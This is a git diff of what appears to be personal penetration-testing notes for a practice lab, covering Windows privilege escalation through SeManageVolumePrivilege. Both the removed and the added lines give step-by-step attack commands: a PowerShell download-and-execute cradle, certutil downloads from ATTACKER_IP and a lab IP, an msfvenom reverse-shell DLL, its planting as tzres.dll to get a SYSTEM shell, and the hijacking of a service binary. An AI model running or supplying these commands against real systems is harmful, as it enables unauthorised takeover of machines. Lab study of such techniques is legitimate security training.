@@ -199,33 +199,37 @@ powershell	powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString
 #### semanagevolumeprivilege
 Step-by-step instructions
 Confirm the user has the SeManageVolumePrivilege using:
-whoami /priv
+`whoami /priv`
 
-Look for SeManageVolumePrivilege in the output. 
-Obtain or compile an exploit tool such as:
-CsEnox/SeManageVolumeExploit
-xct/SeManageVolumeAbuse
-Upload the compiled exploit binary (e.g., SeManageVolumeExploit.exe) to the target system using:
-certutil -urlcache -split -f "http://ATTACKER_IP/SeManageVolumeExploit.exe"
+If it's listed at all, its good.
 
-Run the exploit to trigger the FSCTL_SD_GLOBAL_CHANGE control code:
-SeManageVolumeExploit.exe
+Run the exe of the exploit file:
+`PS C:\Users\svc_mssql> ./SeManageVolumeExploit.exe
+./SeManageVolumeExploit.exe
+Entries changed: 923
+DONE 
+`
 
-This replaces the Administrators SID (S-1-5-32-544) with the Users SID (S-1-5-32-545) across the entire C: drive. 
-Verify file system permissions are altered using:
-icacls "C:\Program Files\SomeService\service.exe"
+Build a .dll shellcode: 
+```sql
+┌──(kali㉿kali)-[~/pglabs/access]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.207 LPORT=80 -f dll | tee ~/pglabs/access/shellcode.dll
+```
 
-You should now see BUILTIN\Users:(F) (Full Control). 
-Replace a privileged service binary (e.g., edgeupdate.exe) with a malicious executable:
-ren "C:\Program Files\Microsoft\Edge Update\edgeupdate.exe" edgeupdate.exe.old
-copy "C:\Tools\malicious.exe" "C:\Program Files\Microsoft\Edge Update\edgeupdate.exe"
+copy it to C:/Windows/System32/wbem/tzres.dll and run systeminfo
+```sql
+PS C:\windows\system32\wbem> certutil -urlcache -split -f http://192.168.45.207/shellcode.dll                                                                                   
+certutil -urlcache -split -f http://192.168.45.207/shellcode.dll                                                                                                                
+****  Online  ****                                                                                                                                                              
+  0000  ...                                                                                                                                                                     
+  2400                                                                                                                                                                          
+CertUtil: -URLCache command completed successfully.                                                                                                                             
+PS C:\windows\system32\wbem> mv shellcode.dll tzres.dll                                                                                                                         
+mv shellcode.dll tzres.dll                                                                                                                                                      
+PS C:\windows\system32\wbem> systeminfo
 
-Restart the service to execute the payload as SYSTEM:
-sc stop "edgeupdate"
-sc start "edgeupdate"
+```
 
-Alternatively, wait for system reboot.
-Gain a SYSTEM shell via your payload (e.g., reverse shell, user creation, etc.).
 
 
 
